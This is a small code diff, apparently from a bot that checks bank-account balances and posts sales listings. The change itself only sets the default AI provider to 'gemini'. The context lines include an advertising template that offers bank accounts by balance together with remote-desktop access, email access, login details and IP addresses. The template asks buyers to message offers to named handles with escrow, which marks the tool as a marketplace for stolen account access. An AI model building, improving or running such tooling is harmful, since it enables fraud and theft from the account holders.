@@ -58,7 +58,7 @@ if admin_env:
 
 # Default Factory Settings
 DEFAULT_CONFIG = {
-    "provider": PROVIDER or "openrouter",
+    "provider": "gemini",
     "balance_check_passes": 1,
     "output_channel_id": OUTPUT_CHANNEL_ID or "",
     "ad_copy": "<b>{bank_name}\nBal  {balance_val}\n\nRdp Access \nEmail Access \nLogin info\nIp\n\nDm your offer \n\nEscrow Accepted \n@Wrong_GuyXD\n@YeggBackup</b>",
